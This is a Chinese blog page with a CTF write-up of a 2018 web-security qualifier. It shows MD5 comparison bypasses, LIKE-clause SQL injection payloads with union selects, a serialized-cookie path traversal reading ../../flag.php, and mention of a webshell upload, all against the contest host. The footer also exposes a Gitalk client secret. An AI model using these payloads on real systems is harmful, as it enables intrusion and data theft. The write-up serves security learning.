<!--
	作者：Sariay
	时间：2018-09-25
	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
-->


	<!DOCTYPE html>
	<html>
		

<head><meta name="generator" content="Hexo 3.8.0">
	<title>2018web安全测试秋季预选赛Writeup</title>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="apple-mobile-web-app-title" content="Amaze UI">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
    <meta name="author" content="miraitowa">
    <meta name="keywords" content="">
    <meta name="description" content="">
   	<!-- css -->
	<link rel="stylesheet" href="/css/style.css">

	<!-- favicon -->
	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
	
	<!-- font-awesome -->
	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
</head>

	<body>	
		<!--Preloader-->
<div id="preloader">
	<div id="status">
		<img alt="PRELOADER" src="/img/logo.png">
	</div>
</div>
<!--Preloader end-->

<!-- header -->

	<header id="header-bg-2">

	
		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
	
	
	<!-- motto or description -->
		
 		<p class="motto"></p>
	
	
	<!-- current page name or title -->
	
		
		
			
			<p class="page-name">当前文章&nbsp;:&nbsp;《2018web安全测试秋季预选赛Writeup》</p>
			
		
	
	
	<!-- others: such as change-bg, time... -->
	<p class="page-name-other">
		12/16/2018 
		<style type="text/css">
	header:after {
		content: '';
		position: relative;
		top: 0;
		left: 0;
		height: 100%;
		width: 100%;
		background: #222222;
		opacity: .5;
		z-index: -1;
	}
	
	.change-header-bg{
		font-style: normal;
	}
	.change-header-bg i{
		text-align: center;
		cursor: pointer;
		pointer-events: bounding-box;
	}
	@media(max-width:512px) {
		.change-header-bg {
			display: none;
			visibility: hidden;
		}
	}
	
</style>

<script type="text/javascript">
	function changeHeaderBg(){
		var random_bg = Math.floor(Math.random() * 109 + 1);
		var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
		$("#header-bg-2").css("background-image", bg);
	}
</script>

<span class="change-header-bg">
	——&nbsp;<i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
</span>
	</p>		
</header>

<!-- nav -->
<div id="cd-nav">
	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>

	<nav id="cd-main-nav">
		<ul>
			
      		<li class="fa fa-/">
           		<a href="/" title="主页">主页</a>	
      		</li>
    		
      		<li class="fa fa-/archives">
           		<a href="/archives" title="归档">归档</a>	
      		</li>
    		
      		<li class="fa fa-/categories">
           		<a href="/categories" title="分类">分类</a>	
      		</li>
    		
      		<li class="fa fa-/gallery">
           		<a href="/gallery" title="相册">相册</a>	
      		</li>
    		
      		<li class="fa fa-/about">
           		<a href="/about" title="关于">关于</a>	
      		</li>
    		
      		<li class="fa fa-/tags">
           		<a href="/tags" title="友链">友链</a>	
      		</li>
    		
    		
        	
		</ul>
	</nav>
</div>

		<!--main-->
		<main> 
		<div class="page-container">
		<!-- content srart -->
<div class="am-g am-g-fixed blog-fixed blog-content">
	<div class="am-u-md-8 am-u-sm-12">

		<article class="am-article blog-article-p">

			<div class="am-article-hd">
				


				<h1 class="am-article-title blog-text-center">
					
					
	
		<a href="/2018/11/12/2018 web安全测试秋季预选赛Writeup/" itemprop="url">		
			2018web安全测试秋季预选赛Writeup		
		</a>
	

				</h1>

				<p class="am-article-meta blog-text-center">
					<span>
						<i class="fa fa-clock-o"></i> 
						<a href="/2018/11/12/2018 web安全测试秋季预选赛Writeup/" itemprop="url">
	<time datetime="2018-11-12T03:43:21.378Z" itemprop="datePublished">
  		2018-11-12
  </time>
</a>    
&nbsp;
					</span>
					
					<span>						
						
					</span>
				</p>
			</div>

			<div class="am-article-bd">
				<div class="content" id="post-content">
					
						<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://i.imgur.com/MlDlJbH.jpg" alt=""></p>
<p>昨天安恒web安全测试秋季预选赛做的太菜了，发现自己是越来越笨了，</p>
<p>最后三道web一题都没有做出来（break heart)</p>
<h3 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h3><p>题目链接：<a href="http://114.55.36.69:8004/" target="_blank" rel="noopener">http://114.55.36.69:8004/</a></p>
<p>题目描述：<code>easy MD5 cracking fail</code></p>
<p>查看源代码：</p>
<pre><code>easy MD5 cracking &lt;!--$_POST[&#39;data1&#39;]!=$_POST[&#39;data2&#39;]--&gt;fail
</code></pre><p>使用数组绕过即可</p>
<p><img src="https://i.imgur.com/xaeQAN0.png" alt=""></p>
<pre><code>flag: flag{401cf19d304e557349fecda18110c138}
</code></pre><h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><p>题目链接：<a href="http://114.55.36.69:8006/" target="_blank" rel="noopener">http://114.55.36.69:8006/</a></p>
<p>题目描述：<code>MD5 crackingfail</code></p>
<p>从根本上讲，MD5算法是一种摘要算法，它可以从多个字节组成的串中计算出由32个字节构成的“特征串”。对于超过32字节的串来说，</p>
<p>MD5计算得出的值必然是其一个子集，所以必然存在两个（或更多）不同的串能够得出相同MD5值的情况。这种情况就叫做MD5碰撞。</p>
<p>我们需要找到两个字符串不一样，但是MD5值一模一样的字符串</p>
<p>这个时候我们<a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip" target="_blank" rel="noopener">用MD5碰撞生成器生成</a></p>
<p>套路同上一题一样，先查看源代码</p>
<pre><code>MD5 cracking&lt;!-- if((string)$_POST[&#39;data1&#39;]!==(string)$_POST[&#39;data2&#39;]&amp;&amp;md5($_POST[&#39;data1&#39;])===md5($_POST[&#39;data2&#39;]))--&gt;fail
</code></pre><p>参考一篇国外的文章：</p>
<p><a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value" target="_blank" rel="noopener">https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value</a></p>
<p>使用curl进行解答本题</p>
<pre><code>curl -v http://114.55.36.69:8006/ -H &quot;Cookie: PHPSESSID=0dvvm795lrkrck7r0t1gbn762n&quot; --data &quot;data1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;data2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;
</code></pre><p><img src="https://i.imgur.com/x5vFlRZ.png" alt=""></p>
<p>最后得到<code>flag:flag{9bd1ee7355b58e53214adb9a37b4cb82}</code></p>
<h4 id="我们可以预先备份一些MD5码编码后的值；"><a href="#我们可以预先备份一些MD5码编码后的值；" class="headerlink" title="我们可以预先备份一些MD5码编码后的值；"></a>我们可以预先备份一些MD5码编码后的值；</h4><p><strong>第一条 </strong></p>
<pre><code>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
</code></pre><p><strong>第二条</strong></p>
<pre><code>4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2
  4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2
</code></pre><p> MD5 hash:<code>008ee33a9d58b51cfeb425b0959121c9</code></p>
<h3 id="传个flag试试"><a href="#传个flag试试" class="headerlink" title="传个flag试试"></a>传个flag试试</h3><p>题目链接：<a href="http://114.55.36.69:8012/" target="_blank" rel="noopener">http://114.55.36.69:8012/</a></p>
<p>题目描述：</p>
<p><img src="https://i.imgur.com/8aEOcac.png" alt=""></p>
<p>根据题目的描述使用<code>HackBar</code>进行<code>post</code>方式的传递</p>
<p><img src="https://i.imgur.com/r2QV7QQ.png" alt=""></p>
<p>继续按照上面的提示进行</p>
<p><img src="https://i.imgur.com/p4esU2R.png" alt=""></p>
<p>最后得到答案：<code>flag{858a14671c27804b63e6e96b0acdfdd7}</code></p>
<h3 id="输入试试"><a href="#输入试试" class="headerlink" title="输入试试"></a>输入试试</h3><p>题目链接：<a href="http://114.55.36.69:8003/" target="_blank" rel="noopener">http://114.55.36.69:8003/</a></p>
<p>题目描述：</p>
<p><img src="https://i.imgur.com/kfTOph7.png" alt=""></p>
<p>首先：查看一下源代码：</p>
<pre><code>&lt;script&gt;
function check(){
var flag = document.getElementById(&quot;flag&quot;).value;
var str = &quot;d84d9657e5e5e&quot; || 0; 
var str = str + (&quot;ad2ad3fe&quot; &amp;&amp; 2);
var str = str + &quot;a2da9494b8&quot; + &quot;ddea4fd4&quot;;
var str = str.split(&quot;&quot;).reverse().join(&quot;&quot;);
if (str == flag){
alert(&quot;恭喜你已经找到flag！&quot;);
}
}
&lt;/script&gt;
</code></pre><p>发现有<code>id=&quot;flag&quot;</code></p>
<p>直接在控制台中进行操作：</p>
<p><img src="https://i.imgur.com/Gl2ESqx.png" alt=""></p>
<p>最后得到答案：<code>4df4aedd8b4949ad2a2e5e5e7569d48d</code></p>
<h3 id="新闻搜索"><a href="#新闻搜索" class="headerlink" title="新闻搜索"></a>新闻搜索</h3><p>题目链接：<a href="http://114.55.36.69:8010/" target="_blank" rel="noopener">http://114.55.36.69:8010/</a></p>
<p>题目描述：</p>
<p><img src="https://i.imgur.com/TjHFnuO.png" alt=""></p>
<p>顺手点击进去一个：</p>
<p><img src="https://i.imgur.com/4gjFnhP.png" alt=""></p>
<p>继续进行测试会发现有关键词，有条数，初步猜测是注入，关键词输入1’发现</p>
<p><img src="https://i.imgur.com/5jHavzQ.png" alt=""></p>
<p>查看源代码发现是前端过滤：</p>
<pre><code>function myFunction()
{
    var x=document.getElementById(&quot;number&quot;).value;
var a=document.getElementById(&quot;word&quot;).value;
var b=a.replace(/[\ |\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\||\\|\[|\]|\{|\}|\;|\:|\&quot;|\&#39;|\,|\&lt;|\.|\&gt;|\/|\?|\·|\！|\（|\）|\￥|\——|\……|\【|\】|\、|\；|\：|\‘|\“|\”|\’|\，|\。|\、|\《|\》|\？|\ ]/g,&quot;&quot;);
if(a.length!=b.length)
{
  alert(&quot;请输入正确字符。&quot;);
  document.getElementById(&quot;number&quot;).value = &#39;&#39;;
  document.getElementById(&quot;word&quot;).value = &#39;&#39;;
}
else if(isNaN(x))
{
  alert(&quot;请输入数字。&quot;);
  document.getElementById(&quot;number&quot;).value = &#39;&#39;;
}
</code></pre><p> 于是手动禁掉js代码，并且猜测后端代码是关键词处查询处存在sql注入</p>
<p><img src="https://i.imgur.com/5E8XO2u.png" alt=""></p>
<p>经过一系列的尝试，却没有任何回显，换一个思维，毕竟幕测的时间很短，题目还很多(QAQ)，拿到flag是王道，使用手动注入，</p>
<p>像这种的关键词查询，一般都是使用<code>like%%</code>的模糊查询,所以需要闭合<code>%</code>，构造<code>payload：1%&#39; AND 1=1 AND &#39;%&#39;=&#39;</code></p>
<p><img src="https://i.imgur.com/JUGCqWh.png" alt=""></p>
<p>由上图回显的信息可以看出注入成功；</p>
<p>这里对like%%进行一些了解，首先我们在本地数据库中输入</p>
<pre><code>mysql&gt; select * from tests where password like &#39;%a%&#39;;
+---------+----------+
| usename | password |
+---------+----------+
| admin   | password |
| admin   | admin|
+---------+----------+
2 rows in set (0.00 sec)

mysql&gt; select * from tests where password like &#39;%as%&#39;;
+---------+----------+
| usename | password |
+---------+----------+
| admin   | password |
+---------+----------+
1 row in set (0.00 sec)
</code></pre><p>可以发现<code>like%$value%</code>相当于<code>/.\*$value.\*/</code>，如果注入的话，我们需要闭合前面的<code>%&#39;</code>,而且还有闭合后面的<code>%&#39;</code></p>
<p><img src="https://i.imgur.com/DXIPOjD.png" alt=""></p>
<p>了解完<code>like%%</code>的注入，接着看题目</p>
<h4 id="得到列"><a href="#得到列" class="headerlink" title="得到列"></a>得到列</h4><p><code>payload: 1%&#39; order by 3-- ：</code>返回正常</p>
<p><code>payload: 1%&#39; order by 4--：</code>返回异常</p>
<p>得知表有为3列</p>
<h4 id="找回显点"><a href="#找回显点" class="headerlink" title="找回显点"></a>找回显点</h4><p><code>payload: 1%&#39; union select 1,2,3--</code> ：在页面下面出现1,2，3</p>
<p><img src="https://i.imgur.com/0AvwkUE.png" alt=""></p>
<h4 id="注入表，列，字段，此处省略过程"><a href="#注入表，列，字段，此处省略过程" class="headerlink" title="注入表，列，字段，此处省略过程"></a>注入表，列，字段，此处省略过程</h4><p>直接给出:<br><code>payload: 1%&#39; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database()),flag from admin--</code></p>
<p><img src="https://i.imgur.com/TvQse5N.png" alt=""></p>
<p>最后得到flag:<code>flag{f98505d1d12f50a0bd9463e90876630}</code></p>
<h4 id="使用sqlmap进行解答："><a href="#使用sqlmap进行解答：" class="headerlink" title="使用sqlmap进行解答："></a>使用sqlmap进行解答：</h4><p><code>post</code>输入框注入，可注入参数在<code>word</code>上，<code>sqlmap</code>跑一下就出来</p>
<p>首先：进行库的查询</p>
<p><img src="https://i.imgur.com/qwePQ2P.png" alt=""></p>
<p>其次：对表进行查询</p>
<p><img src="https://i.imgur.com/UVXctP6.png" alt=""></p>
<p>然后：对字段进行查询</p>
<p><img src="https://i.imgur.com/DXslkAY.png" alt=""></p>
<p>最后：对列的内容进行查询</p>
<p><img src="https://i.imgur.com/YL17Kyc.png" alt=""></p>
<p>最后得到flag：<code>flag{f98505d1d12f50a0bd9463e90876630}</code></p>
<h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><p>题目链接：<a href="http://114.55.36.69:8011" target="_blank" rel="noopener">http://114.55.36.69:8011</a></p>
<p>题目描述：玩个蛇皮</p>
<p><img src="https://i.imgur.com/sPzB68E.png" alt=""></p>
<p>进入界面是一个贪吃蛇的游戏，果断看js代码逻辑，F12查看源码外面是外部的js脚本，在Source中查看发现</p>
<p><img src="https://i.imgur.com/OrRcty1.png" alt=""></p>
<p>于是猜测这一段颜文字应该会有与flag相关的信息，于是console执行一下</p>
<p><img src="https://i.imgur.com/r24QCbZ.png" alt=""></p>
<p>很明显flag是错误的，点击view继续进行查看</p>
<p><img src="https://i.imgur.com/rATMVZR.png" alt=""></p>
<p>最后得到答案：<code>Flag{660332922504a5f06dd871a7fe78ba9c}</code><br>所以我们可以构造为：a:1:{i:0;s:9:”index.php”;}，base64后为YToxOntpOjA7czo5OiJpbmRleC5waHAiO30=，bp重放查看回显</p>
<h3 id="新写的小站"><a href="#新写的小站" class="headerlink" title="新写的小站"></a>新写的小站</h3><p>题目链接： <a href="http://114.55.36.69:8014" target="_blank" rel="noopener">http://114.55.36.69:8014</a></p>
<p>题目描述：新开发的小站，看看能不能发现问题</p>
<p>点击链接进入就会看到一个网站，注册账号之后就会看到：</p>
<p><img src="https://i.imgur.com/Jqd62Rk.png" alt=""></p>
<p>修改type（只能传jpg）上传一张图片,然后在picture内查看发现图片中有一串base64，</p>
<p>在bp中查看发现这一串base很长，在请求包的cookie中发现picture值解码发现为php序列化，而且保存的上传文件的文件名</p>
<p><img src="https://i.imgur.com/nKRROJ6.png" alt=""></p>
<p>使用burp进行解密</p>
<p><img src="https://i.imgur.com/NnMoBVH.png" alt=""></p>
<p>猜测<code>picture</code>传入执行文件，然后页面显示文件内容的<code>base64</code>。于是显示<code>index.php</code>页面，手动构造序列化，在这里我们讲一下一组序列化的组成</p>
<p>举一个栗子：</p>
<pre><code>a:2:{i:0;s:5:&quot;1.jpg&quot;;i:1;s:5:&quot;1.php&quot;;}
a的意思就是数组array
2说明数组里面有两对值
分别为1.jpg与1.php
i作为下标
s代表为string类型
5表示长度
即
0=&gt;1.jpg
1=&gt;1.php
</code></pre><p>所以我们可以构造为：<code>a:1:{i:0;s:9:&quot;index.php&quot;;}，base64后为YToxOntpOjA7czo5OiJpbmRleC5waHAiO30=</code>，<code>burp</code>重放查看回显</p>
<p><img src="https://i.imgur.com/Igq2i3Z.png" alt=""></p>
<p>做到这，有两个思路，一个是上传一句话然后<code>getshell</code>，因为路径是爆出来了，仅仅是<code>type</code>限制；第二个是直接猜<code>flag</code>在哪，读出来。</p>
<p>两种方法都很简单</p>
<p>第一种方法：改<code>type</code>为<code>image/jpg</code>后，访问<code>http://114.55.36.69:8014/upload/x.php</code>，然后传入命令<code>find / -name flag***</code>。</p>
<p>第二种方法：是测试发现，<code>flag</code>在<code>../../flag.php</code>下，</p>
<p>然后构造<code>a:1:{i:0;s:14:&quot;../../flag.php&quot;;}=&gt;YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30=</code>，请求</p>
<h4 id="request"><a href="#request" class="headerlink" title="request"></a>request</h4><pre><code>GET /index.php/picture HTTP/1.1
Host: 114.55.36.69:8014
Proxy-Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://114.55.36.69:8014/index.php/picture
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Picture=YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30=; PHPSESSID=1vm2g30rlcqosqsj9ici1rdku1; session=eyJsb2dpbiI6dHJ1ZSwidXNlcm5hbWUiOiJYWEgifQ.DreFfA.iwKT84kXV5efjz90397IoKUYiik
# response(part)
&lt;img src=&quot;data:image/jpg;base64,PD9waHAKCiRmbGFnID0gImZsYWd7TjRtZV9zUGFjNF9Jc19JbnQzcjNzdDFuZ30iOwplY2hvICJmbGFne1RoaXNfMVNfQV9GNGtlX2YxYUd9IjsK&quot;&gt;
# base64解密
&lt;?php
$flag = &quot;flag{N4me_sPac4_Is_Int3r3st1ng}&quot;;
echo &quot;flag{This_1S_A_F4ke_f1aG}&quot;;
</code></pre><p>最后得到flag:<code>flag{This_1S_A_F4ke_f1aG}</code></p>
<p>唉！！实力有限，只能做出这么几道，至于排名感觉进不去下一场比赛啊。</p>
<p>感谢我的好友对我的帮助，谢谢他们的指导（thx)</p>

					
				</div>
			</div>
		</article>

		<ul class="am-pagination">
    
    	<li class="am-pagination-prev">
   		<a class="pull-left" href="/2018/11/12/蓝鲸安全打卡 第一期密码学/" title="蓝鲸安全打卡 第一期密码学">
      		&laquo; 上一篇
		</a>
		</li>
	
	
 </ul>
        

		<div class="theme-annie-comment-button-container">
	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
		加载评论
		<!--加载评论-->
	</button>
</div>

<div id="annie-comment-container" class="theme-annie-comment-main-container">

	
		
			<!-- comment gitalk -->
			<!-- show gitalk comment -->

  <div id="gitalk-container"></div>


<!-- gitalk`s css & js -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<link rel="stylesheet" href="/css/comment.css">
<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

<script type="text/javascript">
	//thanks O-R
	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
	//去除尾部匹配正则数组的字符串  
	//remove redundant characters
	String.prototype.trimEnd = function(regStr) {
		var result = this;
		if(regStr == undefined || regStr == null || regStr == "") {
			return result;
		}
		var array = regStr.split(',');

		if(array.length > 0) {

			var c = array.shift();
			var str = this;
			var i = str.length;
			var rg = new RegExp(c);
			var matchArr = str.match(rg);

			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
				matchStr = matchStr + '$';
				result = str.replace(new RegExp(matchStr), "");
			}

			if(array.length > 0) {
				return result.trimEnd(array.join())
			} else {
				return result;
			}
		}
	};

	//create gitalk
	var gitalk = new Gitalk({
		clientID: '74a83cc9b15a1cf53e10',
		clientSecret: 'b62af8b132c33178adcb0098e2315806e2e57cae',
		//id: window.location.pathname,
		// id: (window.location.pathname).split("/").pop().substring(0, 49),
		id: md5(location.href.trimEnd('#.*$,\\?.*$,index.html$')),
		repo: 'Annie-Gitalk',
		owner: 'miraitowa',
		admin: 'miraitowa',
		distractionFreeMode: 'true',
	})
	gitalk.render('gitalk-container');
</script>
		
	

</div>

<script type="text/javascript">
	/* Show Comment */
	var Annie_Comment = function() {
		function Show_Hidden(obj) {
			obj.style.display = 'block';
		}
		
		//var obutton = $('#annie-comment-button');
		//var obutton = $('#annie-comment-container');
		var obutton = document.getElementById("annie-comment-button" || "0");
		var odiv = document.getElementById("annie-comment-container");
		if( 'obutton' ) {
			obutton.onclick = function() {
				Show_Hidden(odiv);
				$("#annie-comment-button").css("display", 'none');
				return false;
			}
		}
	};

	(function Annie_Init() {
		Annie_Comment();
	})();
</script>
		
		<!--
	时间：2018-09-24
	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
-->

	
		<aside class="post-widget">
			<nav class="post-toc-wrap" id="post-toc">
				
					<strong>文章目录</strong>
				
				
				<!--toc(post.content)-->
				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-text">前言</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#简单的md5"><span class="post-toc-text">简单的md5</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#md5"><span class="post-toc-text">md5</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#我们可以预先备份一些MD5码编码后的值；"><span class="post-toc-text">我们可以预先备份一些MD5码编码后的值；</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#传个flag试试"><span class="post-toc-text">传个flag试试</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#输入试试"><span class="post-toc-text">输入试试</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#新闻搜索"><span class="post-toc-text">新闻搜索</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#得到列"><span class="post-toc-text">得到列</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#找回显点"><span class="post-toc-text">找回显点</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#注入表，列，字段，此处省略过程"><span class="post-toc-text">注入表，列，字段，此处省略过程</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#使用sqlmap进行解答："><span class="post-toc-text">使用sqlmap进行解答：</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#game"><span class="post-toc-text">game</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#新写的小站"><span class="post-toc-text">新写的小站</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#request"><span class="post-toc-text">request</span></a></li></ol></li></ol></li></ol>
			</nav>
			<div class="post-toc-bar"><div>
		</div></div></aside>
	

	</div>
</div>
		</div>
		</main>
		
		<!--footer-->
		<footer>
	<div class="blog-text-center">
		<div class="theme-annie-social">
				
				
					<a href="https://github.com/miraitowa" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
					
				
				
					<a href="https://miraitowa.github.io/about/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
					
					
						
				
		</div>
	</div>

	<div class="blog-text-center">
		<div class="theme-annie-copyright">
			
				&copy; 2018, content by miraitowa. All Rights Reserved. 			   
			
		</div>
	</div>

	<div class="blog-text-center">
		<div class="theme-annie-copyright">
			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
		</div>
	</div>
</footer>
		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->

<script>
	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
</script>

<style>
	.motto {
		color: #000000;
		font-size: 20px;
		margin: 100px 25% 0;
		width: 50%;
		line-height: 1.4;
		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
		text-align: center;
	}
	@media(max-width: 890px) {
		.motto {	
			margin: 100px 10% 0;
			width: 80%;
		}
	}
	@media(max-width: 890px) {
		.motto {
			margin: 100px 5% 0;
			width: 90%;
		}
	}
</style>


	<script src="/js/motto.js"></script>
	<script type="text/javascript">
		$(".motto").html(getMingYanContent());
	</script>	







	<script type="text/javascript" src="/js/toc.js"></script>


<script type="text/javascript" src="/js/main.js"></script>

<script type="text/javascript">
	//generate a random img that pre_name 'from 0 to 110'
	var random_bg = Math.floor(Math.random() * 109 + 1);

	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
	var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';

	$("#header-bg-2").css("background-image", bg);
</script>
		
		<!--back to top-->
        <style type="text/css">
	#totop {
		background: white;
		border-radius: 50%;
		position: fixed;
		right: 5.4%;
		bottom: 80px;
		cursor: pointer;
	}
	
	#totop a {
		color: #474747;
		background-color: transparent;
		padding: 10px;
		text-decoration: none;
	}
	
	@media(max-width:512px) {
		#totop {
			display: none;
			visibility: hidden;
		}
	}
</style>


	<div id="totop">
  		<a href="javascript:;" class="fa fa-arrow-up"></a>
	</div>

	</body>
	</html>

